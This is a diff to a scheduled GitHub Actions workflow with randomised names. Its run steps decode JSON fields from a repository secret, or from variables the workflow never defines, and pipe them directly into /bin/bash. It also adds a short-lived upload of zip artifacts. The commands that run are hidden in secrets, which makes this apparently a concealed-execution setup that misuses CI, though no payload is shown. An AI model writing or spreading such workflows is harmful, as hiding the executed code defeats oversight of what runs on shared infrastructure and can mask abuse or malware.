@@ -1,9 +1,9 @@
 name: victoriapolling27
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '9 2/6 * * *'
+    - cron: '30 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: victoriapolling27
         env:
-          wcbm87417: ${{ secrets.wcbm87417 }}
+          pj0: ${{ secrets.pj0 }}
         run: |
-          echo $wcbm87417 | jq -r .yn14175 | /bin/bash
-          echo $gbynf67001 | jq -r .sh34941 | /bin/bash
-          echo $anodq98190 | jq -r .dzl9387 | /bin/bash
-          echo $tpz9 | jq -r .v063 | /bin/bash
-          echo $n3 | jq -r .mgok62937 | /bin/bash
-          echo $r7690 | jq -r .vfs62850 | /bin/bash
+          printf '%s' "$pj0" | jq -r .pdll8 | /bin/bash
+          echo $a9 | jq -r .mi4 | /bin/bash
+          printf '%s' "$jy25909" | jq -r .j8 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Q4POPX7r
+          path: "*.zip"
+          retention-days: 1
